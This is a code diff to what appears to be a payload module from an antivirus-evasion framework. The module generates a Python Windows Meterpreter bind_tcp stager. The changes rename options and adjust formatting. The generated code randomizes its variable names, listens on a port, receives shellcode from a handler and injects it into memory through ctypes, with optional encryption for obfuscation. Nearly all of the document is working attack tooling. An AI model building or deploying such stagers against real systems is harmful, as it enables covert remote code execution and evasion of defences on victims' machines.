@@ -9,22 +9,26 @@ from modules.common import encryption
 from modules.common.pythonpayload import PythonPayload
 
 class Payload(PythonPayload):
-    
+
     def __init__(self):
+        # pull in shared options
         PythonPayload.__init__(self)
+
         # required options
         self.description = "pure windows/meterpreter/bind_tcp stager, no shellcode"
         self.rating = "Excellent"
-        
+
         # optional
-        # options we require user interaction for- format is {Option : [Value, Description]]}
-        self.required_options["RHOST"] = ["", "The listen target address"]
-        self.required_options["LPORT"] = ["4444", "The listen port"]
-        
-        
+        # options we require user interaction for- format is {OPTION : [Value, Description]]}
+        self.required_options = {
+                                    "LHOST"        : ["", "The listen target address"],
+                                    "LPORT"        : ["4444", "The listen port"],
+                                }
+        self.required_options.update(self.required_python_options)
+
     def generate(self):
         self._validateArchitecture()
-        
+
         # randomize all of the variable names used
         shellCodeName = helpers.randomString()
         socketName = helpers.randomString()
@@ -41,8 +45,8 @@ class Payload(PythonPayload):
         shellcodeBufName = helpers.randomString()
         fpName = helpers.randomString()
         tempCBuffer = helpers.randomString()
-        
-        
+
+
         payloadCode = "import struct, socket, binascii, ctypes, random, time\n"
 
         # socket and shellcode variables that need to be kept global
@@ -56,7 +60,7 @@ class Payload(PythonPayload):
         payloadCode += "\t\tglobal %s\n" %(clientSocketName)
         # build the socket and connect to the handler
         payloadCode += "\t\t%s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" %(socketName)
-        payloadCode += "\t\t%s.bind(('%s', %s))\n" %(socketName,self.required_options["RHOST"][0],self.required_options["LPORT"][0])
+        payloadCode += "\t\t%s.bind(('%s', %s))\n" %(socketName,self.required_options["LHOST"][0],self.required_options["LPORT"][0])
         payloadCode += "\t\t%s.listen(1)\n" % (socketName)
         payloadCode += "\t\t%s,_ = %s.accept()\n" % (clientSocketName, socketName)
         # pack the underlying socket file descriptor into a c structure
@@ -95,7 +99,7 @@ class Payload(PythonPayload):
         # inject what we grabbed
         payloadCode += "%s(%s)\n" % (injectMethodName,shellCodeName)
 
-        if self.required_options["use_pyherion"][0].lower() == "y":
+        if self.required_options["USE_PYHERION"][0].lower() == "y":
             payloadCode = encryption.pyherion(payloadCode)
 
         return payloadCode
